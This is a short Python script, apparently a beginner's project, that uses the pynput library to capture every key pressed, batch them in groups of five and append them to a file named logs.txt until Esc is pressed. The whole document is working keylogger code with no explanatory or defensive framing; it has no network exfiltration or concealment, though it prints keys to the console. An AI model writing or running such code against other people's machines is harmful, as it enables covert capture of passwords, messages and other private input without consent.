from pynput.keyboard  import Key, Listener

keys=[]
c=0

def press(key):
	global keys,c
	keys.append(key)
	print(key)
	c+=1
	if c>=5:
		c=0
		write(keys)
		keys=[]
	

def write(keys):
	with open("logs.txt","a") as f:
		for key in keys:
			k=str(key).replace("'","")
			if k.find('space') > 0:
				f.write('\n')
			if k.find('Key') == -1:
				f.write(str(k))


def rel(key):
	if key==Key.esc:
		return False



with Listener(on_press = press, on_release= rel) as listener:
	listener.join()